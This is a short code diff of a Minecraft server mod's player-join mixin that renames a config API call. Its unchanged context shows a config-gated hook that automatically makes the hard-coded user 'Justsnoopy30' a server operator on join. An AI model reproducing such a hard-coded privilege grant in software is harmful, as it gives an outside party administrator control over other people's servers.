@@ -38,7 +38,7 @@ public abstract class PlayerManagerMixin {
     public void postPlayerJoin(ClientConnection clientConnection, ServerPlayerEntity player, CallbackInfo callbackInfo) {
         GameProfile gameProfile = player.getGameProfile();
         // See config if you want to turn this off
-        if (Mod.getConfig().getNode("op-beacon-dev-on-join").getBoolean() && gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
+        if (Mod.getConfig().node("op-beacon-dev-on-join").getBoolean() && gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
             this.addToOperators(gameProfile);
         }
         BeaconPlayerJoinEvent.firePost(clientConnection, player);
